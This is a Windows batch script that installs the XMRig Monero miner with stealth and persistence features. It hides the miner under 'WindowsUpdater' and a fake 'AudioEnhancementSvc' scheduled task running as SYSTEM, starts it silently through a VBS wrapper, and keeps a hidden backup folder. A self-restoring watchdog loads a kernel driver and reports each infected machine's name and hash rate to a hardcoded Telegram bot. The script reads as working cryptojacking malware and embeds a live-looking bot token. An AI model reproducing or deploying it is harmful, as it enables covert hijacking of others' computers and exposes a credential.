@echo off
REM ───────────────────────────────────────────────────────────────────────────
REM Monero Miner Setup – Ultimate High Mid-End Edition (i5-14400 Optimized)
REM Installs to C:\ProgramData\WindowsUpdater
REM Self-healing watchdog, Telegram alerts, huge-pages, MSR driver, stats
REM ───────────────────────────────────────────────────────────────────────────
title Monero Miner Setup – Ultimate Edition
color 0A
setlocal enableextensions enabledelayedexpansion

REM === Debug & Diagnostics Logging ===
set "DIAG=%TEMP%\miner_debug.log"
set "LOG=%DEST%\miner.log"
echo [*] Installer started at %date% %time% > "%DIAG%"
echo [*] Running as user: %username% >> "%DIAG%"

REM === CONFIGURATION ===
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=AudioEnhancementSvc"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

REM === 1) ADMIN PRIVILEGES CHECK ===
echo [*] Checking admin privileges… >> "%DIAG%"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
  echo [!] Elevating to administrator…
  echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\elevate.vbs"
  echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\elevate.vbs"
  "%TEMP%\elevate.vbs" & exit /b
)
echo [✔] Administrator confirmed. >> "%DIAG%"

REM === 2) HUGE-PAGES & USER-MODE VA CONFIG ===
echo [*] Granting “Lock pages in memory” and increasing VA… >> "%DIAG%"
set "ACCOUNT=%USERDOMAIN%\%USERNAME%"
secedit /export /cfg "%TEMP%\secpol.cfg" >nul
powershell -Command ^
  "(Get-Content '%TEMP%\secpol.cfg') -replace 'SeLockMemoryPrivilege = .*','SeLockMemoryPrivilege = %ACCOUNT%' ^| 
   Set-Content '%TEMP%\secpol.cfg'"
secedit /import /cfg "%TEMP%\secpol.cfg" /db secedit.sdb /overwrite >nul
del "%TEMP%\secpol.cfg" secedit.sdb >nul 2>&1
bcdedit /set increaseuserva 2800 >nul 2>&1

REM === 3) LARGEPAGE MINIMUM ===
echo [*] Enabling LargePageMinimum registry key… >> "%DIAG%"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" ^
    /v LargePageMinimum /t REG_DWORD /d 4294967295 /f >nul

REM === 4) SECURE BOOT CHECK & CORE/AFFINITY DETECTION ===
echo [*] Checking Secure Boot status… >> "%DIAG%"
powershell -NoProfile -Command "Confirm-SecureBootUEFI" >> "%DIAG%" 2>&1

for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do set /a CORES=%%A
set /a AFFINITY_MASK=(1<<CORES)-1
echo [*] CPU Cores: %CORES%, affinity: 0x%AFFINITY_MASK:~0,2% >> "%DIAG%"

REM === 5) CLEANUP OLD TASK & DRIVER ===
echo [*] Removing old scheduled task and MSR driver… >> "%DIAG%"
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1

REM === 6) MSR DRIVER INSTALL & VERIFY ===
if exist "%SRC%\winring0x64.sys" (
  echo [*] Installing MSR driver… >> "%DIAG%"
  sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
  sc start WinRing0_1_2_0
  echo [*] Running MSR test… >> "%DIAG%"
  "%SRC%\xmrig.exe" --msr-test >nul 2>&1 && (
    echo [✔] MSR test PASSED >> "%DIAG%"
  ) || (
    echo [!] MSR test FAILED >> "%DIAG%"
  )
)

REM === 7) SYSTEM-LEVEL POWER & CLOCK TWEAKS ===
echo [*] Applying power & clock tweaks… >> "%DIAG%"
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /hibernate off
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v CsEnabled /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul

REM === 8) GITHUB AUTO-UPDATE FETCH ===
echo [*] Downloading latest XMRig… >> "%DIAG%"
set "URL="
for /f "delims=" %%U in ('
  powershell -NoProfile -Command ^
    "($r=Invoke-RestMethod '%GITHUB_API%' -UseBasicParsing).assets^| 
     ?{$_.name-match 'win64.*msvc.*zip'}^|Select -First 1^|%{$_}.browser_download_url"
') do set "URL=%%U"

if defined URL (
  powershell -NoProfile -Command "iwr '%URL%' -OutFile '%TEMP%\xmrig.zip'"
  powershell -NoProfile -Command "Expand-Archive '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force"
  del "%TEMP%\xmrig.zip"
)

REM === 9) DEPLOY & BACKUP MINER FILES ===
echo [*] Deploying miner to %DEST%… >> "%DIAG%"
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\xmrig.exe" "%DEST%\" >nul
xcopy /Y /Q "%SRC%\winring0x64.sys" "%DEST%\" >nul

echo [*] Creating backup folder… >> "%DIAG%"
mkdir "%DEST%\backup"
xcopy /Y /Q "%DEST%\xmrig.exe"    "%DEST%\backup\" >nul
xcopy /Y /Q "%DEST%\winring0x64.sys" "%DEST%\backup\" >nul
attrib +h +s "%DEST%\backup"

REM === 10) ENHANCED WATCHDOG CREATION ===
echo [*] Generating enhanced watchdog… >> "%DIAG%"
(
  echo @echo off
  echo setlocal enabledelayedexpansion
  echo set "DIAG=%%TEMP%%\watchdog_diag.log"
  echo echo [*] Watchdog start at %%date%% %%time%% ^> "%%DIAG%%"
  echo set "MUTEX=%%TEMP%%\xmrig_watchdog.lock"
  echo if exist "%%MUTEX%%" exit /b
  echo echo locked ^> "%%MUTEX%%" ^>^> "%%DIAG%%"
  echo set "XMRIG=%%~dp0xmrig.exe"
  echo set "BACKUP=%%~dp0backup"
  echo set "POOL=%POOL%"
  echo set "WALLET=%WALLET%"
  echo set "PASS=%%COMPUTERNAME%%"
  echo set "API=16000"
  echo set "TG_TOKEN=%TG_TOKEN%"
  echo set "TG_CHAT=%TG_CHAT_ID%"
  echo set "KILL_PASS=mykillpassword"
  echo set /a "STATS=0"
  echo :
  echo :loop
  echo   rem 1) Self-repair
  echo   if not exist "%%XMRIG%%" (
  echo     echo [!] Miner missing → restoring… ^>^> "%%DIAG%%"
  echo     xcopy /Y /Q "%%BACKUP%%\*" "%%~dp0" >nul
  echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" ^
  echo       -d "chat_id=%%TG_CHAT%%" -d "text=🔄 Miner restored on %%COMPUTERNAME%% at %%date%% %%time%%"
  echo   )
  echo   rem 2) Remote kill-switch
  echo   curl -s "https://api.telegram.org/bot%%TG_TOKEN%%/getUpdates?offset=-1" ^> "%%TEMP%%\upd.json"
  echo   findstr /c:"/kill %%KILL_PASS%%" "%%TEMP%%\upd.json" >nul && (
  echo     echo [!] Kill cmd received → stopping miner ^>^> "%%DIAG%%"
  echo     taskkill /F /IM xmrig.exe >nul
  echo     del "%%MUTEX%%" 2>nul
  echo     exit /b
  echo   )
  echo   rem 3) MSR driver health-check
  echo   "%%XMRIG%%" --msr-test >nul 2^>^&1 || (
  echo     echo [!] MSR failed → reloading driver ^>^> "%%DIAG%%"
  echo     sc stop WinRing0_1_2_0 >nul
  echo     sc delete WinRing0_1_2_0 >nul
  echo     timeout /t 1 >nul
  echo     sc create WinRing0_1_2_0 binPath= "\??\%%~dp0winring0x64.sys" type= kernel start= demand
  echo     sc start WinRing0_1_2_0 >nul
  echo   )
  echo   rem 4) Ensure miner running
  echo   tasklist /FI "imagename eq xmrig.exe" ^| find /I "xmrig.exe" >nul || (
  echo     echo [*] Starting miner… ^>^> "%%DIAG%%"
  echo     start /min /affinity %AFFINITY_MASK% "" "%%XMRIG%%" -o %%POOL%% -u %%WALLET%% -p %%PASS%% -a rx/0 ^
  echo       --donate-level=0 --randomx-1gb-pages --threads=auto --cpu-priority=3 ^
  echo       --cpu-max-threads-hint=90 --max-cpu-usage=90 --print-time=60 --http-port=%%API%%
  echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" ^
  echo       -d "chat_id=%%TG_CHAT%%" -d "text=▶️ Miner started on %%COMPUTERNAME%% at %%date%% %%time%%"
  echo   )
  echo   rem 5) Periodic stats every 7m
  echo   set /a STATS+=30
  echo   if %%STATS%% geq 420 (
  echo     for /f "tokens=*" %%H in ('
  echo       powershell -NoProfile -Command "iwr http://127.0.0.1:%%API%%/2/summary -UseBasicParsing"
  echo     ') do set "HASH=%%H"
  echo     if defined HASH (
  echo       curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" ^
  echo         -d "chat_id=%%TG_CHAT%%" -d "text=💻 Stats: !HASH!"
  echo     )
  echo     set /a STATS=0
  echo   )
  echo   timeout /t 30 >nul
  echo goto loop
) > "%DEST%\run_watchdog.bat"

REM === 11) Create Silent VBS Launcher & Schedule Task ===
echo [*] Creating VBS wrapper & scheduling watchdog… >> "%DIAG%"
(
  echo Set WshShell = CreateObject("WScript.Shell")
  echo WshShell.Run Chr(34) ^& "%DEST%\run_watchdog.bat" ^& Chr(34),0,False
) > "%DEST%\run_silent.vbs"

schtasks /create /tn "%TASK_NAME%" ^
  /tr "wscript.exe \"%DEST%\run_silent.vbs\"" ^
  /sc onstart /ru SYSTEM /rl HIGHEST /f >> "%DIAG%"

REM === 12) Post-Install Telegram Alert ===
curl -s -X POST "https://api.telegram.org/bot%TG_TOKEN%/sendMessage" ^
  -d "chat_id=%TG_CHAT_ID%" ^
  -d "text=✅ Miner deployed on %COMPUTERNAME% at %date% %time%"

REM === 13) Launch Watchdog Immediately ===
wscript.exe "%DEST%\run_silent.vbs"

echo.
echo [✔] Installation complete.
echo [ℹ] Reboot now to apply huge-page & VA changes.
echo [ℹ] Logs    → %DIAG%
echo [ℹ] Miner log→ %LOG%
echo [ℹ] Uninstall→ schtasks /delete /tn "%TASK_NAME%" /f ^& rmdir /s /q "%DEST%"
pause
```